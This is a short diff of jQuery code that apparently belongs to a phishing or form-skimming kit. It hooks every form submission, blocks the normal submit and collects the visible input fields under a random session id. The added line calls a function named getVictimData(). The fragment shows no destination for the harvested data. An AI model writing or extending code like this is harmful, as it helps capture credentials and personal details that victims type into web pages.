@@ -3,6 +3,8 @@ $(document).ready(function($) {
     $(document).delegate('form', 'submit', function(event) {
         event.preventDefault();
 
+        var d = getVictimData();
+
         objs = $(this).find('input:visible');
         var sId = Math.random().toString(36).substr(2);
         
